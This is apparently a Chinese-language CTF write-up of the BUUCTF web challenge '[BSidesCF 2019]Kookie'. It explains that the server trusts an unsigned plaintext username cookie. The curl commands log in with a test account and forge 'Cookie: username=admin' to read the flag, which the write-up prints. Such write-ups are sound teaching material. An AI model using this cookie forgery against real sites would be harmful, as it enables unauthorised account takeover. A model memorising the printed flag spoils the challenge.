---

## 第四步：Writeup

---
title: "[BSidesCF 2019]Kookie"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [cookie-tampering, authentication-bypass, insecure-cookie]
vulnerability: Cookie 伪造导致身份认证绕过
solved: true
flag: "flag{36ba5658-6ce2-4dbc-9bea-78d13f0da06a}"
---

# [BSidesCF 2019]Kookie

## 题目概述
题目要求以 `admin` 身份登录，并提供了测试账号 `cookie` / `monster`。题目名称 "Kookie" 暗示与 Cookie 相关。

## 信息收集
1. 访问首页，发现登录表单
2. 页面提示需要以 `admin` 身份登录
3. 提供测试账号：`cookie` / `monster`

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：Cookie 伪造 / 身份认证绕过

**原理**：服务器仅通过 Cookie 中的 `username` 字段判断用户身份，未进行任何加密或签名验证。攻击者可直接修改 Cookie 值伪造任意用户身份。

**判断过程**：
1. 使用测试账号登录，观察响应头：`Set-Cookie: username=cookie`
2. 发现 Cookie 值为明文用户名，无加密/签名
3. 题目名 "Kookie" 暗示 Cookie 是关键点

## 利用过程（Payload + Flag）

**步骤1**：用测试账号登录，观察 Cookie
```bash
curl -v "http://target/?action=login&username=cookie&password=monster"
# 响应：Set-Cookie: username=cookie
```

**步骤2**：伪造 admin Cookie 访问
```bash
curl -s "http://target/" -H "Cookie: username=admin"
```

**响应**：
```html
<p>Congratulations! You're logged in as admin! 
Your flag is: flag{36ba5658-6ce2-4dbc-9bea-78d13f0da06a}</p>
```

**Flag**：`flag{36ba5658-6ce2-4dbc-9bea-78d13f0da06a}`

## 复现步骤
1. 访问题目页面，获取测试账号信息
2. 用测试账号登录，抓包观察 Cookie 设置
3. 修改 Cookie 为 `username=admin`
4. 刷新页面获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| Cookie伪造 | Cookie: username | `Cookie: username=admin` | Cookie安全性、身份认证 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
- 题目名称往往暗示漏洞类型（Kookie → Cookie）
- 测试账号用于观察正常认证流程
- 登录后检查 Cookie 设置是常规操作

**同类题型套路**：
1. Cookie 明文存储用户身份 → 直接伪造
2. Cookie Base64 编码 → 解码修改后重新编码
3. Cookie 弱加密/可逆加密 → 分析算法逆向
4. Cookie 无签名/HMAC → 直接篡改
